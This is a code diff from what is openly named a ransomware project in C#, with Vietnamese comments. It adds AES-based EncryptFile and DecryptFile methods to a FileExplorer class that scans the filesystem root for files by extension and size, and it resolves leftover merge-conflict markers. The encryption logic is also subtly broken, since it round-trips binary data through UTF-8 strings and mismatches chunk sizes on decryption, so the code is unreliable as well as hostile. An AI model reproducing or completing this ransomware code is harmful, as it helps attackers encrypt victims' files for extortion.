@@ -3,41 +3,32 @@
 
 using Ransomware.Sources.Utils;
 using System.Collections.Concurrent;
+using System.Text;
 
 
 namespace Ransomware.Sources.Application;
 class FileExplorer
 {
     private bool isRunning;
+    private readonly AesCipher aesCipher;
     private readonly HashSet<string> excludedDirectories; // Danh sách thư mục bị loại trừ
     private readonly HashSet<string> allowedFileExtensions; // Danh sách định dạng file được cho phép
     public ConcurrentBag<FileDetail> SpecificFiles { get; private set; } // Danh sách file cụ thể
 
-    public FileExplorer()
+    public FileExplorer(AesCipher aesCipher)
     {
         // Khởi tạo danh sách thư mục cần bỏ qua
         this.excludedDirectories = new HashSet<string>(EnvironmentInspector.DirectoriesToSkip());
 
         // Khởi tạo danh sách định dạng file cần lưu
-<<<<<<< HEAD
         this.allowedFileExtensions = Config.LoadExtensions();
-=======
-        this.allowedFileExtensions = ConfigLoader.FileExtensions();
->>>>>>> 9354e9dd3a9a2a24d601710409caf0f9ccdcd5a4
 
-        this.isRunning = false;  
+
+        this.isRunning = true;  
+        this.aesCipher = aesCipher;
         this.SpecificFiles = new ConcurrentBag<FileDetail>();  
     }
 
-<<<<<<< HEAD
-    private bool StartsWithAny(this string str, HashSet<string> prefixes)
-    {
-        // Kiểm tra xem chuỗi có bắt đầu bằng bất kỳ tiền tố nào không
-        return prefixes.Any(prefix => str.StartsWith(prefix, StringComparison.OrdinalIgnoreCase));
-    }
-
-=======
->>>>>>> 9354e9dd3a9a2a24d601710409caf0f9ccdcd5a4
     private bool IsWritable(string path)
     {
         try
@@ -98,6 +89,50 @@ class FileExplorer
         }
     }
 
+    public void EncryptFile(string filePath, long fileSize)
+    {
+        string outputPath = Path.ChangeExtension(filePath, ".enc");
+        int bufferSize = (int)Math.Min(fileSize, 8192);
+
+        using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
+        using (FileStream outputFileStream = new FileStream(outputPath, FileMode.Create, FileAccess.Write))
+        {
+            byte[] buffer = new byte[bufferSize];
+            int bytesRead;
+
+            // Đọc từng phần của tệp và mã hóa
+            while ((bytesRead = inputFileStream.Read(buffer, 0, buffer.Length)) > 0)
+            {
+                // Mã hóa dữ liệu đọc được
+                byte[] encryptedData = this.aesCipher.Encrypt(Encoding.UTF8.GetString(buffer, 0, bytesRead));
+                outputFileStream.Write(encryptedData, 0, encryptedData.Length);
+            }
+        }
+    }
+
+    // Phương thức giải mã tệp theo từng phần
+    public void DecryptFile(string filePath, long fileSize)
+    {
+        string outputPath = Path.ChangeExtension(filePath, null); // Bỏ phần mở rộng
+        int bufferSize = (int)Math.Min(fileSize, 8192);
+
+        using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
+        using (FileStream outputFileStream = new FileStream(outputPath, FileMode.Create, FileAccess.Write))
+        {
+            byte[] buffer = new byte[bufferSize];
+            int bytesRead;
+
+            // Đọc từng phần của tệp và giải mã
+            while ((bytesRead = inputFileStream.Read(buffer, 0, buffer.Length)) > 0)
+            {
+                // Giải mã dữ liệu đọc được
+                string decryptedData = this.aesCipher.Decrypt(buffer.Take(bytesRead).ToArray());
+                byte[] dataToWrite = Encoding.UTF8.GetBytes(decryptedData);
+                outputFileStream.Write(dataToWrite, 0, dataToWrite.Length);
+            }
+        }
+    }
+
     public enum SortOrder
     {
         Ascending,  // Từ nhỏ đến lớn
@@ -106,10 +141,10 @@ class FileExplorer
 
     public List<FileDetail> Scan(long minimumSize = 1024 * 1024, SortOrder sortOrder = SortOrder.Ascending)
     {
-        if (!this.isRunning) 
+        if (this.isRunning) 
         {
             FindFiles(EnvironmentInspector.Root());
-            this.isRunning = true; 
+            this.isRunning = false;
         }
 
         // Lọc và sắp xếp theo kích thước dựa trên kiểu sắp xếp
